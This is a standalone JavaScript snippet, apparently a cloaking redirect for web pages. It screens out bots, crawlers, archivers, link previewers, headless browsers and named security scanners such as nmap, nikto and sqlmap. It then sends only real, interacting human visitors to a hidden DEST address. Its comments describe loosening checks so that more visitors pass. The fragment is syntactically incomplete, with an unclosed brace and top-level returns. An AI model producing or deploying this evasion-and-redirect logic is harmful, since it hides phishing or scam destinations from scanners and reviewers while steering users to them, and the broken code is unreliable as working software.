<script>

  var ua = (navigator.userAgent || "").toLowerCase();

  var UA_BLOCK = /bot|crawl|spider|scrape|slurp|curl|wget|python|requests|urllib|httpx|aiohttp|java\/|okhttp|node-fetch|axios|got\/|go-http|perl|ruby|libwww|php\/|scan|nmap|nikto|sqlmap|masscan|zmap|pingdom|uptime|monitor|lighthouse|pagespeed|headless|phantom|puppeteer|playwright|selenium|webdriver|chrome-lighthouse|gtmetrix|semrush|ahrefs|moz\.com|majestic|screaming|deepcrawl|botify|seznam|yandex|baidu|sogou|exabot|ia_archiver|archive\.org|wayback|commoncrawl|ccbot|petalbot|applebot|duckduckbot|facebookexternalhit|twitterbot|linkedinbot|whatsapp|telegrambot|discordbot|skypeuripreview|embedly|quora|pinterest|slackbot|vkshare|w3c_validator|validator\.nu|feedfetcher|google-read-aloud|google web preview|google-inspectiontool|googleother|google-extended|adsbot|mediapartners|apis-google|storebot-google|chrome\/\d+.*safari\/537.*headless/i;

  if (UA_BLOCK.test(ua) || ua.length < 20) return;

  // ============================================================

  // ============================================================
  if (navigator.webdriver === true) return;

  // ============================================================
  // LAYER 3: LOOSENED — only require universally-supported APIs

  if (typeof navigator.languages === "undefined") return;
  if (typeof window.requestAnimationFrame === "undefined") return;

  // ============================================================
  // LAYER 4: Headless fingerprints (permissions check removed)
  // ============================================================
  if (/HeadlessChrome/i.test(navigator.userAgent)) return;
  if (window.callPhantom || window._phantom || window.__nightmare) return;
  if (window.Buffer && !window.emit) return;

  // ============================================================
  // LAYER 5: LOOSENED — only reject if BOTH dimensions are zero
  // ============================================================
  var sw = window.screen && window.screen.width;
  var sh = window.screen && window.screen.height;
  if (sw === 0 && sh === 0) return;

  // ============================================================
  // LAYER 6: REMOVED (timezone check)
  // ============================================================

  // ============================================================
  // LAYER 7: LOOSENED — only reject pure software renderers
  // ============================================================
  try {
    var canvas = document.createElement("canvas");
    var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    if (gl) {
      var dbg = gl.getExtension("WEBGL_debug_renderer_info");
      if (dbg) {
        var renderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || "";
        // Only reject the clearest headless indicators
        if (/swiftshader|llvmpipe/i.test(renderer)) return;

    }
  } catch (e) { /* ignore */ }

  // ============================================================
  // LAYER 8: Behavioral interaction (unchanged)
  // ============================================================
  var interacted = false;
  var arms = ["mousemove", "mousedown", "touchstart", "keydown", "scroll"];

  function arm() {
    interacted = true;
    arms.forEach(function (e) {
      window.removeEventListener(e, arm, true);
    });
    setTimeout(fire, 100);
  }

  arms.forEach(function (e) {
    window.addEventListener(e, arm, true);
  });

  // ============================================================
  // LAYER 9: Time-gate (unchanged)
  // ============================================================
  var loadTs = Date.now();

  function fire() {
    var elapsed = Date.now() - loadTs;
    var wait = Math.max(0, 100 - elapsed);

    setTimeout(function () {
      if (document.visibilityState !== "visible") return;
      if (!interacted) return;

      try {
        window.location.replace(DEST);
      } catch (e) {
        window.location.href = DEST;
      }
    }, wait);
  }

  // Fallback for touch-only devices
  document.addEventListener("touchstart", arm, { once: true, capture: true });
